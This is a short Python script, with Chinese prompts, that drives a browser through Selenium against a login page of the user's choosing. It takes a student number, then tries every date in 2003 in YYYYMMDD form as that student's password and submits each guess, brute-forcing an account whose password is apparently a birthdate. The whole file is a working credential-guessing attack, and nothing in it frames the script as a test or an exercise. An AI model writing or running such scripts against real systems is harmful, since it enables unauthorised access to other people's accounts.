import time
from selenium import webdriver
from selenium.webdriver.common.by import By
import datetime
print("请输入登录网站url")
url=input()
print("输入学号")
account=input()
driver = webdriver.Edge()
driver.get(url)
driver.find_element(By.ID,"userAccount").send_keys(account)
# 定义2003年的第一天和最后一天
start_date = datetime.date(2003, 1, 1)
end_date = datetime.date(2003, 12, 31)

# 循环遍历每一天
current_date = start_date
while current_date <= end_date:
    driver.find_element(By.ID, "userAccount").clear()
    driver.find_element(By.ID, "userPassword").clear()
    # print(type(current_date))
    ans = current_date.strftime("%Y%m%d")
    print(ans)
    current_date += datetime.timedelta(days=1)
    driver.find_element(By.ID, "userAccount").send_keys(account)
    driver.find_element(By.ID,"userPassword").send_keys(f"{ans}")
    driver.find_element(By.CSS_SELECTOR,"#ul1 > li:nth-child(4) > button").click()
    driver.find_element(By.ID, "userAccount").clear()
    driver.find_element(By.ID, "userPassword").clear()


